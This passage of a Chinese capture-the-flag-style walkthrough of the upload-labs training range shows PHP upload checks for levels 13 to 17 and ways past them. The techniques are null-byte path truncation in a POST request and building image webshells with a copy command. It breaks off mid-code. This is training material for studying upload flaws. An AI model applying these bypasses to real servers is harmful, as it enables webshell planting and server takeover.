    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-12" class="header-mark"></a>绕过方法</h3><p>与上一关类似，不同的是通过POST请求来控制路径。</p>
<p>POST请求添加截断字符的方法：</p>
<ol>
<li>先在路径<code>upload/webshell.php</code>后面打个<code>+</code>  =&gt; <code>upload/webshell.php+</code></li>
<li>将包的内容转成16进制(选择Hex)</li>
<li>找到<code>+</code>的位置(<code>+</code>的16进制是<code>2b</code>)</li>
<li>将<code>2b</code>改成<code>00</code></li>
</ol>
<p>其他的做法跟上一关基本一致。</p>
<p>​</p>
<h2 id="第十四关图片马过unpack" class="headerLink">
    <a href="#%e7%ac%ac%e5%8d%81%e5%9b%9b%e5%85%b3%e5%9b%be%e7%89%87%e9%a9%ac%e8%bf%87unpack" class="header-mark"></a>第十四关(图片马过unpack())</h2><h3 id="相关源码-13" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-13" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">getReailFileType</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$bin</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">//只读2字节
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$strInfo</span> <span class="o">=</span> <span class="o">@</span><span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;C2chars&#34;</span><span class="p">,</span> <span class="nv">$bin</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl">    <span class="nv">$typeCode</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$strInfo</span><span class="p">[</span><span class="s1">&#39;chars1&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$strInfo</span><span class="p">[</span><span class="s1">&#39;chars2&#39;</span><span class="p">]);</span>    
</span></span><span class="line"><span class="cl">    <span class="nv">$fileType</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>    
</span></span><span class="line"><span class="cl">    <span class="k">switch</span><span class="p">(</span><span class="nv">$typeCode</span><span class="p">){</span>      
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">255216</span><span class="o">:</span>            
</span></span><span class="line"><span class="cl">            <span class="nv">$fileType</span> <span class="o">=</span> <span class="s1">&#39;jpg&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">13780</span><span class="o">:</span>            
</span></span><span class="line"><span class="cl">            <span class="nv">$fileType</span> <span class="o">=</span> <span class="s1">&#39;png&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>        
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">7173</span><span class="o">:</span>            
</span></span><span class="line"><span class="cl">            <span class="nv">$fileType</span> <span class="o">=</span> <span class="s1">&#39;gif&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>            
</span></span><span class="line"><span class="cl">            <span class="nv">$fileType</span> <span class="o">=</span> <span class="s1">&#39;unknown&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>    
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$fileType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file_type</span> <span class="o">=</span> <span class="nx">getReailFileType</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$file_type</span> <span class="o">==</span> <span class="s1">&#39;unknown&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;文件未知，上传失败！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$file_type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;上传出错！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-13" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-13" class="header-mark"></a>绕过方法</h3><p>代码通过读文件的前 2 个字节，检测上传文件二进制的头信息，判断文件类型。</p>
<p>利用图片马绕过检测。</p>
<p>图片马制作：</p>
<p>在 cmd 里执行 <code>copy logo.jpg/b+webshell.php/a webshell.jpg</code></p>
<ul>
<li>logo.jpg 为任意图片</li>
<li>webshell.php 为我们要插入的木马代码</li>
<li>webshell.jpg 为我们要创建的图片马</li>
</ul>
<p>要利用图片马必须要用到文件包含漏洞。</p>
<p>​</p>
<h2 id="第十五关图片马过getimagesize" class="headerLink">
    <a href="#%e7%ac%ac%e5%8d%81%e4%ba%94%e5%85%b3%e5%9b%be%e7%89%87%e9%a9%ac%e8%bf%87getimagesize" class="header-mark"></a>第十五关(图片马过getimagesize())</h2><h3 id="相关源码-14" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-14" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$types</span> <span class="o">=</span> <span class="s1">&#39;.jpeg|.png|.gif&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$info</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">image_type_to_extension</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$types</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">isImage</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;文件未知，上传失败！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="nv">$res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;上传出错！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-14" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-14" class="header-mark"></a>绕过方法</h3><p>代码通过 <code>getimagesize()</code> 获取上传文件信息。</p>
<p>利用图片马绕过检测。</p>
<p>​</p>
<h2 id="第十六关图片马过exif_imagetype" class="headerLink">
    <a href="#%e7%ac%ac%e5%8d%81%e5%85%ad%e5%85%b3%e5%9b%be%e7%89%87%e9%a9%ac%e8%bf%87exif_imagetype" class="header-mark"></a>第十六关(图片马过exif_imagetype())</h2><h3 id="相关源码-15" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-15" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//需要开启php_exif模块
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$image_type</span> <span class="o">=</span> <span class="nx">exif_imagetype</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nv">$image_type</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">IMAGETYPE_GIF</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;gif&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">IMAGETYPE_JPEG</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;jpg&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nx">IMAGETYPE_PNG</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;png&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>    
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">isImage</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;文件未知，上传失败！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;上传出错！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-15" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-15" class="header-mark"></a>绕过方法</h3><p>代码利用<code>exif_imagetype()</code>读取一个图像的第一个字节并检查其后缀名。</p>
<p>利用图片马绕过检测。</p>
<p>​</p>
<h2 id="第十七关二次渲染绕过" class="headerLink">
    <a href="#%e7%ac%ac%e5%8d%81%e4%b8%83%e5%85%b3%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87" class="header-mark"></a>第十七关(二次渲染绕过)</h2><h3 id="相关源码-16" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-16" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filetype</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$tmpname</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$target_path</span><span class="o">=</span><span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 获得上传文件的扩展名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$fileext</span><span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">strrchr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s2">&#34;.&#34;</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">//判断文件后缀与类型，合法才进行上传操作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;jpg&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span><span class="nv">$target_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//使用上传的图片生成新的图片
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$target_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$im</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;该文件不是jpg格式的图片！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$target_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//给新图片指定文件名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">srand</span><span class="p">(</span><span class="nx">time</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$newfilename</span> <span class="o">=</span> <span class="nx">strval</span><span class="p">(</span><span class="nx">rand</span><span class="p">())</span><span class="o">.</span><span class="s2">&#34;.jpg&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$newfilename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">imagejpeg</span><span class="p">(</span><span class="nv">$im</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$target_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;上传出错！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;png&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/png&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span><span class="nv">$target_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//使用上传的图片生成新的图片
